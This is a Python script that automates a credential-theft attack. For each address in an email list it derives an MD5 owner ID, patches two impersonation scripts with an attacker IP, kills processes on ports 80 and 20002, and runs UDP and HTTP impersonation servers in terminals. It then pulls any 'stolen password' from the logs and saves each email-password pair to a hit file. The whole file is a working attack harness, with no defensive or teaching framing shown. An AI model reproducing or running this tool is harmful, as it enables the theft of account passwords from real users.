import subprocess
import hashlib
import time
import os
import signal
import re

ATTACKER_IP = "192.168.137.112"
PORTS_TO_KILL = [20002, 80]


def get_owner(email: str) -> str:
    return hashlib.md5(email.encode()).hexdigest().upper()


def patch_file(filename: str, replacements: dict):
    with open(filename, "r") as f:
        content = f.read()
    for key, value in replacements.items():
        content = re.sub(rf'^{key}\s*=.*', f'{key} = "{value}"', content, flags=re.MULTILINE)
    with open(filename, "w") as f:
        f.write(content)


def kill_port(port):
    result = subprocess.run(
        f"sudo lsof -i :{port} -t", shell=True, stdout=subprocess.PIPE
    )
    pids = result.stdout.decode().strip().split("\n")
    for pid in pids:
        if pid:
            os.kill(int(pid), signal.SIGKILL)


def launch_terminal(title, command):
    return subprocess.Popen([
        "gnome-terminal", "--", "bash", "-c", f'echo -e "\\033]0;{title}\\007"; {command}; exec bash'
    ])


def scan_logs():
    time.sleep(3)  # 等待日志刷新
    with open("http.log", "r") as f:
        for line in f:
            if "stolen password=" in line:
                return line.split("stolen password=")[-1].strip()
    return None


def close_all_terminals():
    subprocess.run('pkill -f "gnome-terminal"', shell=True)


def main():
    with open("email_list.txt") as f:
        emails = [line.strip() for line in f if line.strip()]

    total = len(emails)
    for idx, email in enumerate(emails, 1):
        print("\n" + "━" * 50)
        print(f"[{idx}/{total}] Trying email: {email}")

        owner = get_owner(email)
        for port in PORTS_TO_KILL:
            kill_port(port)

        patch_file("UDPImpersonation.py", {
            "attackerIP": ATTACKER_IP,
            "OWNER": owner
        })

        patch_file("HTTPHandshakeImpersonation.py", {
            "attackerIP": ATTACKER_IP
        })

        open("http.log", "w").close()

        udp = launch_terminal("UDP", "python3 UDPImpersonation.py > udp.log")
        http = launch_terminal("HTTP", "python3 HTTPHandshakeImpersonation.py > http.log")

        time.sleep(10)
        password = scan_logs()
        if password:
            print(f"\n[✓] Success!")
            print(f"[✓] Email: {email}")
            print(f"[✓] Password: {password}")
            with open("hit_log.txt", "a") as f:
                f.write(f"{email},{password}\n")
            close_all_terminals()
            return

        print("[×] No password found. Closing terminals and trying next email…")
        udp.terminate()
        http.terminate()
        time.sleep(2)

    print("\n[x] All emails tried, no password obtained.")


if __name__ == "__main__":
    main()
